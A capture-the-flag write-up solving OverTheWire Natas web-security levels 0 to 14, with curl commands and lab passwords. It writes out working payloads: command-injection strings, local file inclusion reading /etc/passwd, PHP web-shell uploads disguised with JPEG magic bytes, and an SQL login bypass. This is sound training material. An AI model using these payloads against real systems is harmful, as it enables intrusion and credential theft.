# Natas wargames server-side web security

#### [https://overthewire.org/wargames/](https://overthewire.org/wargames/)

Progressively I refactor my code so you will see a straight forward or a more defined / clean functional script

---

### natas0
---
Password flag is in the comment
```
Login to web:
Inspect element and look for the comment.

view-source:http://natas0.natas.labs.overthewire.org/
```
curl
```
curl -sv http://natas0.natas.labs.overthewire.org/ --user natas0:natas0 | grep -oe '<!--[A-Za-z].*' | cut -d ' ' -f6
```
python script
- [natas0/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas0/solve.py)


### natas1
---
Javascript blocked the rightclick option.
```
Login to web:
view-source:http://natas1.natas.labs.overthewire.org/
```
curl
```
curl -sv http://natas1.natas.labs.overthewire.org --user natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto | grep -o '<!--[A-Za-z].*' | awk '{print $6}'
```
python script
- [natas1/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas1/solve.py)


### natas2
---
Includes a jpeg found there is a files directory
```
Login to web:
view-source:http://natas2.natas.labs.overthewire.org/files
click on the table element where there is users.txt
```
curl
```
curl -sv http://natas2.natas.labs.overthewire.org/files/users.txt --user natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi | grep natas3 | awk -F: '{print $2}'
```

python script
- [natas2/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas2/solve.py)


### natas3
HINT:No more information leaks.. even google.. related to web crawling. 
```
Login to web:
view-source:http://natas3.natas.labs.overthewire.org
http://natas3.natas.labs.overthewire.org/robots.txt
```

Found: /s3cr3t/ directory
```
http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
```
curl
```
curl -sv http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt --user natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 | grep natas4 | cut -d':' -f2'
```

python script
    - [natas3/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas3/solve.py)


### natas4
---
Referer request header

Burpsuite
```
Login to web:
Access is disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
Intercept data using proxy and burpsuite
```

Refresh page
```
Intercept request and get a referer header from burpsuite: *Referer: http://natas4.natas.labs.overthewire.org/index.php*
Changed and send the referer header packet to natas5: *Referer: http://natas5.natas.labs.overthewire.org/index.php* 
```
curl
```
curl -sv http://natas4.natas.labs.overthewire.org/index.php -H "Referer: http://natas5.natas.labs.overthewire.org/" --user natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ | grep "Access" | cut -d' ' -f8
```

python script
- [natas4/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas4/solve.py)


### natas5
---
Cookie / Sessions
```
Login to web:
Access disallowed. You are not logged in
```
On Chrome:
```
Developer tools -> Application -> Storage -> Cooies -> loggedin 0 changed to 1 -> refresh
```
On Firefox:
```
Developer tools -> Storage -> Cookies -> loggedin 0 changed to 1 -> refresh
```
burpsuite
```
Intercept data using burp proxy -> Changed cookie __utma=176859643.542715508.1591005549.1591005549.1591025816.2; __utmc=176859643; __utmz=176859643.1591005549.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmb=176859643.7.10.1591025816; loggedin=1
Forward request
```
curl 
```
curl -sv http://natas5.natas.labs.overthewire.org/ --user natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq --cookie 'loggedin=1' | grep "Access" | sed s'/<\/div>//g' | awk '{print $8}'
```

python script
- [natas5/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas5/solve.py)


### natas6
---
Secret value in directory includes/secret.inc and send query

View the source code, found includes. *includes/secret.inc*
```
view-source:http://natas6.natas.labs.overthewire.org/includes/secret.inc
input the secret code: FOEIUWGHFEEUHOFUOIU
```
curl
```
curl -X POST -sv http://natas6.natas.labs.overthewire.org/ --user natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 -F secret=FOEIUWGHFEEUHOFUOIU -F submit=submit | grep "Access" | awk '{print $8}'
```
or 
```
curl -X POST -sv http://natas6.natas.labs.overthewire.org/ --user natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 -H 'Content-Type: application/x-www-form-urlencoded' -d 'secret=FOEIUWGHFEEUHOFUOIU&submit=submit' | grep "Access" | awk '{print $8}'
```

python script
- [natas6/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas6/solve.py)


### natas7
---
Path / directory traversal / local file inclusion

View the source code the hint is: */etc/natas_webpass/natas8* as the storage for passwords
```
Login to web
http://natas7.natas.labs.overthewire.org/index.php?page=home
```
Confirmed server os and web application server using wappalyzer
```
OS: debian
Web server: Apache
```
Confirmed traversal
```
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/passwd
```
Access the storage of password
```
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```
curl
```
curl -X GET -sv http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8 --user natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 | grep -oe '^[A-Za-z0-9].*$'
```

python script
- [natas7/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas7/solve.py)


### natas8
---
Encoded reverse hex base64 to be entered as secret code
```
Login to web:
view-source:http://natas8.natas.labs.overthewire.org/
```   
Found some php code:
```
$encodedSecret = "3d3d516343746d4d6d6c315669563362"; function encodeSecret($secret) { return bin2hex(strrev(base64_encode($secret)));  }
```
On linux shell:
```
echo -n "3d3d516343746d4d6d6c315669563362" | xxd -r -p | rev | base64 -d
send the decoded string
```
curl
```
curl -X POST -sv -N http://natas8.natas.labs.overthewire.org/ --user natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe -F secret=$(echo -n "3d3d516343746d4d6d6c315669563362" | xxd -r -p | rev | base64 -d) -F submit=submit | grep -oe '^[A-Za-z0-9].*$' | cut -d' ' -f8 | tr -d '\n'
```

python script
- [natas8/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas8/solve.py)


### natas9
---
Command Injection. If $key variable is not null, it will be pass thru to grep command to search in the dictionary.txt
```
Login to web:
view-source:http://natas9.natas.labs.overthewire.org/
```
PHP code; on PHP documentation, passthru is like exec() or system() function
```
if($key != "") { passthru("grep -i $key dictionary.txt"); }
```
Exploit using cat command injection or regex grep
```
'[A-Za-z0-9].*$' /etc/natas_webpass/natas10
```
or
```
;cat /etc/natas_webpass/natas10
```
curl
```
curl -X POST -sv http://natas9.natas.labs.overthewire.org/ --user natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl -F needle="'^[A-Za-z0-9].*$' /etc/natas_webpass/natas10 //" -F submit=submit | grep -o '^\/.*' | awk -F: '{print $2}'
```
or
```
curl -X POST -sv http://natas9.natas.labs.overthewire.org/ --user natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl -F needle="'^[A-Za-z0-9].*$' /etc/natas_webpass/natas10 | xargs echo" -F submit=submit | grep -v ^[\<A-Z].*$ | awk -F' ' '{print $2}'
```

python script
- [natas9/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas9/solve.py)


### natas10
---
Command "&" and ";" is now filtered. It can be exploited by regex or using wildcard
```
Login to web:
view-source:http://natas10.natas.labs.overthewire.org/
```
PHP code; on PHP documentation, passhtru is like exec() or system() function
```
";" and "&" is now filtered: if(preg_match('/[;|&]/',$key)) { ... }
```
Exploit using regex or wildcard
```
'[A-Za-z0-9].*$' /etc/natas_webpass/natas11
```
or grep multiple files
```
.* /etc/natas_webpass/natas11 
```
curl
```
curl -X POST -sv http://natas10.natas.labs.overthewire.org/ --user natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu -F needle="'^[A-Za-z0-9].*$' /etc/natas_webpass/natas11 \\" -F submit=submit | grep -o '\/etc.*' | awk -F: '{print $2}'
```

python script
- [natas10/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas_10/solve.py)


### natas11
Basic xor encryption. It can be decrypted using the known plaintext attack
```
Login to web:
view-source:http://natas11.natas.labs.overthewire.org/index-source.html
```
XOR PHP function
```
function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
```
Given plaintext:
```
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
```
Cipher text:
```
ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D
```
You will get the key for the xor encryption.

I run the [php code](https://github.com/catx0rr/overthewire/blob/master/natas/natas_11/findkey.php) and translate it to [python](https://github.com/catx0rr/overthewire/blob/master/natas/natas_11/findkey.py) here.
```
qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
```
Changed the value of *show password* to "yes" on the given plaintext and use the key. It will return the correct ciphertext.
```
ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
```
Pass on the browser javascript console the data and refresh
```
document.cookie="data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK"
```
curl
```
After decoding the key and get the xor encrypted base64 encoded cookie value pass it on curl

curl -X POST -sv http://natas11.natas.labs.overthewire.org/ --user natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK --cookie 'data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK' -F value='#ffffff' -F submit=submit | grep -oe '[a-zA-Z0-9]\{32\}'.*\<br\> | tr -d '<br>'
```

python script
- [natas11/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas_11/solve.py)


### natas12
---
Uploading exploit using the vulnerability of the function
```
Login to web:
view-source:http://natas12.natas.labs.overthewire.org/index-source.html
```
Code used to create a random path and filename with .jpg extension.
```
function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}
```
Create a simple php payload on linux terminal to get the password from the server.
```
echo "<?php echo '<pre>'; system('cat /etc/natas_webpass/natas13'); echo '</pre>'; ?>" > showpass.php
```

After inspecting element, changed the hidden input *randomString.jpg* extension to .php to successfully translate the .jpg file into a php file
```
<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000">

Choose a JPEG to upload (max 1KB):<input type="hidden" name="filename" value="<randomstr>.jpg"><br>
<input name="uploadedfile" type="file"><br>
<input type="submit" value="Upload File">
</form>
```
Upload the file and go to the path
```
go to: http://natas12.natas.labs/overthewire.org/upload/<uploadedfile.php>
```

python script
- [natas11/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas_12/solve.py)


### natas13
---
PHP function function exif image-type vulnerability will check magic numbers of uploaded file
```
Login to web:
view-source:http://natas13.natas.labs.overthewire.org/index-source.html
```
PHP function on uploaded files to check if file is a image type
```
if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
    
    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```
Create a simple .php payload 
```
echo "<?php echo '<pre>'; system('cat /etc/natas_webpass/natas14'); echo '</pre>'; ?>" > showpass.php
```
Edit magic numbers to become a fake .jpg file (on linux terminal) (-b binary mode)
```
vim -b showpass.php
```
Simple tr1x On vim, to edit hex file
```
:%!xxd
```
Insert magic numbers of jpg ([source](https://en.wikipedia.org/wiki/List_of_file_signatures))
```
0000000: ffd8 ffdb 3c3f 7068 7020 6563 686f 2022 ...
...
...
...
```
Save command vim:
```
:%!xxd -r
:wq
```
or you can simply use a hex editor
```
hexeditor -b showpass.php

Add nullbyte (ctrl+A)
Modify the null magic number:
FF D8 FF DB
```
Send the data to the server (change randomstr.php same as natas12)
```
<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000">

Choose a JPEG to upload (max 1KB):<input type="hidden" name="filename" value="<randomstr>.jpg"><br>
<input name="uploadedfile" type="file"><br>
<input type="submit" value="Upload File">
</form>
```
Upload the file and go to the path
```
go to: http://natas12.natas.labs/overthewire.org/upload/<uploadedfile.php>
```

python script
- [natas_13/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas_13/exploit.py)


### natas14
---
SQL injection
```
Login to web:
view-source:http://natas14.natas.labs.overthewire.org/index-source.html
```
SQLi vulnerable query
```
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
if(array_key_exists("debug", $_GET)) {
            echo "Executing query: $query<br>";
                
} 
```
If you try: " (double-quote) you will get an sql error based on the query
```
Warning: mysql_num_rows() expects parameter 1 to be resource, boolean given in /var/www/natas/natas14/index.php on line 24
Access denied!
```
Inject SQL query
```
" or 1 -- -
Login
```

python script
- [natas_14](https://github.com/catx0rr/overthewire/blobl/master/natas/natas_14/exploit.py)
